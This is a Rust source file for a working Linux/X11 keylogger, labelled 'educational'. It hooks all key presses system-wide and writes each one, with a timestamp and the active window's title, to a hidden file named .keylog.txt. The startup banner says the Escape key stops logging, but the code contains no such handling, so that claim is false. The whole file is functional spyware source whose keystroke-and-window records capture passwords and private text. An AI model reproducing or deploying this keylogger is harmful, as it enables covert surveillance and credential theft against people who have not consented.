use chrono::Local;
use rdev::{listen, EventType};
use std::fs::OpenOptions;
use std::io::Write;
use x11::xlib;

fn get_active_window_title() -> String {

    unsafe {
        let display = xlib::XOpenDisplay(std::ptr::null());
        if display.is_null(){
            return "Unknown".to_string();
        }

        let mut root: xlib::Window = 0;
        let mut active: xlib::Window = 0;
        let mut revert: i32 = 0;

        xlib::XGetInputFocus(display, &mut active, &mut revert);

        if active == 0{
            xlib::XCloseDisplay(display);
            return "Unknown".to_string();
        }

        let mut title = Vec::with_capacity(256);
        let mut actual_type: xlib::Atom = 0;
        let mut actual_format: i32 = 0;
        let mut nitems: u64 = 0;
        let mut bytes_after: u64 = 0;
        let mut prop: *mut u8 = std::ptr::null_mut();

        let net_wm_name = xlib::XInternAtom(display, "_NET_WM_NAME\0".as_ptr() as *const i8, 0);
        let utf8_string = xlib::XInternAtom(display, "UTF8_STRING\0".as_ptr() as *const i8, 0);

        if xlib::XGetWindowProperty(
            display,
            active,
            net_wm_name,
            0,
            256,
            0,
            utf8_string,
            &mut actual_type,
            &mut actual_format,
            &mut nitems,
            &mut bytes_after,
            &mut prop,
        ) == xlib::Success as i32 
        {
if !prop.is_null() && nitems > 0 {
    title.extend_from_slice(std::slice::from_raw_parts(prop, nitems as usize));
}
xlib::XFree(prop as *mut std::ffi::c_void);
        }
        xlib::XCloseDisplay(display);

        String::from_utf8_lossy(&title).to_string()
    }

}


fn main(){
    println!("[+] Educational Keylogger Started");
    println!("[+] Press the `Escs` key to stop.");
    println!("[+]  Logging to file: .keylog.txt");

    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open(".keylog.txt")
    .expect("[-] Failed to open log file");

    let callback = move |event: rdev::Event| {
        let now = Local::now();
        let timestamp = now.format("%Y-%m-%d %H:%M:%S%.3f");
        let window_title = get_active_window_title();
        match event.event_type {
            EventType::KeyPress(key) => {
                let log_message = format!("[{}] [{}] key Pressed: {:?}\n", timestamp, window_title, key);

                print!("{}", log_message);
                if let Err(e) = file.write_all(log_message.as_bytes()){
                    eprintln!("[-] Failed to write to file: {}", e)
                }
            } 
            _ => (),
        }
    };
    if let Err(error) = listen(callback) {
        eprintln!("Error: {:?}", error);
    }
}